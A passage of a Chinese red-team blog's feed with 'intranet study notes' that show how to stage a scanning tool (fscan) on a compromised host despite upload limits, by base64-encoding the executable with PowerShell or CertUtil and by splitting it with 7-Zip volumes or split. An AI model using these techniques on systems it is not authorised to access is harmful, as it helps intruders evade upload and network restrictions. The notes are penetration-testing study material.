class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210706145250.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>使用 wesng 可以直接看到目标主机可能存在的 CVE 漏洞，从而便于我们有针对性的利用这些漏洞。</p><blockquote><p>参考文章：</p><p><a href="https://cloud.tencent.com/developer/article/1043370">https://cloud.tencent.com/developer/article/1043370</a></p><p><a href="https://blog.csdn.net/nathan8/article/details/108804056">https://blog.csdn.net/nathan8/article/details/108804056</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;在内网中，往往所有主机打补丁的情况都是相似的，因此在拿下一台主机权限后，可以通过查看当前主机打补丁的情况，从而找到漏洞利用点</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】13、内网中绕过无法上传文件限制</title>
    <link href="https://www.teamssix.com/210701-161347.html"/>
    <id>https://www.teamssix.com/210701-161347.html</id>
    <published>2021-07-01T08:13:47.000Z</published>
    <updated>2021-08-04T08:22:03.548Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h2><p>有次发现这样的一个情况，目标云桌面不出网且不允许上传文件但是可以复制文本，于是便想着通过 PowerShell 将 exe 程序编码成 base64 文本，将编码后的内容复制到目标主机后，再进行解码，这里记录下方法。</p><h2 id="2、PowerShell"><a href="#2、PowerShell" class="headerlink" title="2、PowerShell"></a>2、PowerShell</h2><p>使用 PowerShell 进行 base64 编码</p><pre class="line-numbers language-none"><code class="language-none">$PEBytes &#x3D; [System.IO.File]::ReadAllBytes(&quot;fscan.exe&quot;)$Base64Payload &#x3D; [System.Convert]::ToBase64String($PEBytes)Set-Content fscan_base64.txt -Value $Base64Payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用 PowerShell 进行 base64 解码</p><pre class="line-numbers language-none"><code class="language-none">$Base64Bytes &#x3D; Get-Content (&quot;fscan_base64.txt&quot;)$PEBytes&#x3D; [System.Convert]::FromBase64String($Base64Bytes)[System.IO.File]::WriteAllBytes(&quot;fscan_base64.exe&quot;,$PEBytes)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210630172410.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="3、CertUtil"><a href="#3、CertUtil" class="headerlink" title="3、CertUtil"></a>3、CertUtil</h2><p>自 Windows 7 开始，Windows 自带了 CertUtil 命令，可以使用 CertUtil 进行 MD5、SHA1 等算法的计算，也可以使用 CertUtil 进行 base64 的编码，使用起来要比 PowerShell 方便不少。</p><p>使用 CertUtil 进行编码</p><pre class="line-numbers language-none"><code class="language-none">CertUtil -encode fscan.exe fscan_base64.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 CertUtil 进行解码</p><pre class="line-numbers language-none"><code class="language-none">CertUtil -decode fscan_base64.txt fscan_base64.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210630173155.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"> </p><blockquote><p>参考文章：</p><p><a href="https://www.cnblogs.com/lfoder/p/8241548.html">https://www.cnblogs.com/lfoder/p/8241548.html</a></p><p><a href="https://blog.csdn.net/henter/article/details/80079531">https://blog.csdn.net/henter/article/details/80079531</a><br>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、前言&quot;&gt;&lt;a href=&quot;#1、前言&quot; class=&quot;headerlink&quot; title=&quot;1、前言&quot;&gt;&lt;/a&gt;1、前言&lt;/h2&gt;&lt;p&gt;有次发现这样的一个情况，目标云桌面不出网且不允许上传文件但是可以复制文本，于是便想着通过 PowerShell 将 exe </summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】两种突破内网中无法上传大文件的方法</title>
    <link href="https://www.teamssix.com/210630-113201.html"/>
    <id>https://www.teamssix.com/210630-113201.html</id>
    <published>2021-06-30T03:32:01.000Z</published>
    <updated>2021-09-09T14:45:25.059Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在内网中，有时偶尔会因为种种限制，导致无法上传大文件，以至于只能上传小文件。</p><p>在前段时间就碰到了这个问题，当时在拿下目标 shell 后发现只能上传几百 K 的小文件，文件稍微大些比如几 M 的文件就会提示上传失败，在此简单记录下当时解决的办法。</p><p>针对这种情况，就需要将大文件变成小文件后再进行上传，个人觉着可以简单的分为两种方式，一种是常规的压缩文件一种是分割文件，先来看看第一种方法。</p><h1 id="0x01-压缩文件"><a href="#0x01-压缩文件" class="headerlink" title="0x01 压缩文件"></a>0x01 压缩文件</h1><p>这里以 7-Zip 为代表，其他的压缩软件还有 WinRAR 等，7-Zip 文件下载地址：<a href="https://www.7-zip.org/">https://www.7-zip.org/</a></p><p>如果目标主机没有安装 7-Zip，可以现在自己的主机上安装 7-Zip，然后把安装目录下的 7z.exe 拷贝到目标主机上，默认路径为「C:\Program Files\7-Zip\7z.exe」。</p><p>7z.exe 只有 400 多 K 的大小，可以说很是小巧了，以下为 7z.exe 的常用命令。</p><pre class="line-numbers language-none"><code class="language-none">a     添加压缩文件x     解压压缩文件-p    指定密码-v    分卷压缩-r    递归压缩-o    指定输出目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="普通的压缩-解压文件"><a href="#普通的压缩-解压文件" class="headerlink" title="普通的压缩/解压文件"></a>普通的压缩/解压文件</h3><p>把 fscan.exe 压缩成 fscan.7z，压缩密码为『teamssix.com』</p><pre class="line-numbers language-none"><code class="language-none">7z.exe a -pteamssix.com fscan.7z fscan.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;7z.exe a -pteamssix.com fscan.7z fscan.exe7-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive:1 file, 2911744 bytes (2844 KiB)Creating archive: fscan.7zAdd new data to archive: 1 file, 2911744 bytes (2844 KiB)Files read from disk: 1Archive size: 2794266 bytes (2729 KiB)Everything is Ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把 fscan.7z 解压成 fscan.exe</p><pre class="line-numbers language-none"><code class="language-none">7z.exe x -pteamssix.com fscan.7z<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;7z.exe x -pteamssix.com fscan.7z7-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive for archives:1 file, 2794266 bytes (2729 KiB)Extracting archive: fscan.7z--Path &#x3D; fscan.7zType &#x3D; 7zPhysical Size &#x3D; 2794266Headers Size &#x3D; 170Method &#x3D; LZMA2:3m BCJ 7zAESSolid &#x3D; -Blocks &#x3D; 1Everything is OkSize:       2911744Compressed: 2794266<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fscan.7z 的大小是 2729 KB，fscan.exe 的大小是 2844 KB，可以看到其实大小差别也不大，没能达到我们将大文件变成小文件的目的，这种大小上传可能还是会失败，那再来试试分卷上传。</p><h3 id="分卷压缩-解压文件"><a href="#分卷压缩-解压文件" class="headerlink" title="分卷压缩/解压文件"></a>分卷压缩/解压文件</h3><p>分卷压缩其实和下面介绍的分割文件有点类似，区别还是在于一个对文件进行了压缩，一个没有进行压缩。</p><p>把 fscan.exe 以 500 K 大小进行分卷压缩。</p><pre class="line-numbers language-none"><code class="language-none">7z.exe a -pteamssix.com -v500k fscan.7z fscan.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;7z.exe a -pteamssix.com -v500k fscan.7z fscan.exe7-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive:1 file, 2911744 bytes (2844 KiB)Creating archive: fscan.7zAdd new data to archive: 1 file, 2911744 bytes (2844 KiB)Files read from disk: 1Archive size: 2794266 bytes (2729 KiB)Everything is Ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;dir 驱动器 C 中的卷没有标签。 卷的序列号是 2C2C-615D C:\7-Zip 的目录2021&#x2F;06&#x2F;29  21:42    &lt;DIR&gt;          .2021&#x2F;06&#x2F;29  21:42    &lt;DIR&gt;          ..2021&#x2F;05&#x2F;06  15:00           489,472 7z.exe2021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.0012021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.0022021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.0032021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.0042021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.0052021&#x2F;06&#x2F;29  21:40           234,266 fscan.7z.0062021&#x2F;06&#x2F;18  14:58         2,911,744 fscan.exe               8 个文件      6,195,482 字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把 fscan.7z 解压成 fscan.exe</p><pre class="line-numbers language-none"><code class="language-none">7z.exe x -pteamssix.com fscan.7z.001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;7z.exe x -pteamssix.com fscan.7z.0017-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive for archives:1 file, 512000 bytes (500 KiB)Extracting archive: fscan.7z.001--Path &#x3D; fscan.7z.001Type &#x3D; SplitPhysical Size &#x3D; 512000Volumes &#x3D; 6Total Physical Size &#x3D; 2794266----Path &#x3D; fscan.7zSize &#x3D; 2794266--Path &#x3D; fscan.7zType &#x3D; 7zPhysical Size &#x3D; 2794266Headers Size &#x3D; 170Method &#x3D; LZMA2:3m BCJ 7zAESSolid &#x3D; -Blocks &#x3D; 1Everything is OkSize:       2911744Compressed: 2794266<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，使用分卷压缩可以把一个大文件分成多个小文件，然后将小文件上传上去后，再进行解压就可以了。</p><p>但这样做感觉还是有些麻烦，直接使用下文的 split 进行文件分割个人觉着是更为方便的方法，使用 split 进行分割也是我个人解决前段时间碰到不能上传大文件问题时的方法。</p><h1 id="0x02-分割文件"><a href="#0x02-分割文件" class="headerlink" title="0x02 分割文件"></a>0x02 分割文件</h1><p>使用 split 以 500 K 大小分割 fscan.exe 文件，split 命令在 Linux 和 MAC 下都是自带的，因此在自己的电脑上分割好后，直接上传即可。</p><pre class="line-numbers language-none"><code class="language-none">split -b 500k fscan.exe teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>合并分割文件为 fscan.exe</p><pre class="line-numbers language-none"><code class="language-none">cat teamssix* &gt; fscan# 适用于 Linux、Maccopy &#x2F;b teamssix* fscan.exe# 适用于 Windows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210629220302.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>个人觉着直接用 split 分割文件是较为方便的做法，无需第三方软件，且不论目标是 Linux 还是 Windows 都能支持。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在内网中，有时偶尔会因为种种限制，导致无法上传大文件，以至于只能上传小文件。&lt;/p&gt;
&lt;p&gt;在前段时</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
</feed>
